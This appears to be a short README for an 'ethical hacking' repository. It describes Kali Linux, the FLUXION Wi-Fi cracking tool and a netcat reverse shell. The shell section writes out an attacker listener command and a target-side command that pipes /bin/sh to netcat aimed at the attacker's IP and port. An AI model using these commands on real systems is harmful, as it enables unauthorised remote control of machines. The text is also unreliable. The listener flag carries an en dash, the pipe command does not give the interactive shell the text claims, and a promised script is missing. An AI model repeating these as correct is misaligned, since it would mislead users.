# Python-Ehtical-Hacking

You need to have these two tools to run trhe script

## 1) Kali Linux OS –
Kali Linux is one of the best operating system based on UNIX having more than 1000s of pre-installed tools based on network/forensics/webapp etc. Kali Linux is an open source OS having monolithic type kernel and available in both 32-bit and 64-bit architecture.

There are so many automated cracking tools are there to crack into wi-fi networks like Gerix Wi-Fi Cracker and Fern Wi-Fi Cracker but all are limited to only WEP and WPA based networks but the tool which we’ll discuss is FLUXION is developed in python and usually used to crack WPA2-PSK based networks. DentaFlux is the developer who developed this awesome wi-fi cracking tool.

## 2) NetCat
Netcat is a command in Linux which is used to perform port listening, port redirection, port checking, or even network testing. Netcat is also called a swiss army knife of networking tools. This command is also used to create a reverse shell. Before getting in depth of reverse shell one must be aware of what exactly is netcat tool. To know more, you can go through the article netcat command.

Generally, in order to hack into a system, an attacker tries to gain shell access to execute the malicious payload commands. The gained shell is called the reverse shell which could be used by an attacker as a root user and the attacker could do anything out of it. During the whole process, the attacker’s machine acts as a server that waits for an incoming connection, and that connection comes along with a shell.

Creating Reverse Shells
### 1. Setup a listener: The very first step is to set up a listener on the attacker’s machine in order to act as a server and to listen to the incoming connections. Use the following command to start listening.

nc –nlvp 5555
Replace the port number 5555 with the port you want to receive the connection on.

netcat-listen



This will start the listener on the port 5555.

### 2. Receive connection along with a shell from target: Now as we have started listening, it’s time to execute a basic payload at the target so that we could get a reverse shell. Use the following command to send the request to the attacker.

/bin/sh | nc 127.0.0.1 5555
Replace 127.0.0.1 with the host IP of the attacker and 5555 with the attacker’s port.

netcat-connect

This will give a reverse shell to the attacker which attacker could use to execute any command.

### 3. Executing a command through shell: Now if we enter any command at the receiver’s terminal the output would be displayed on the attacker’s terminal.

netcat-live-reverse-shell
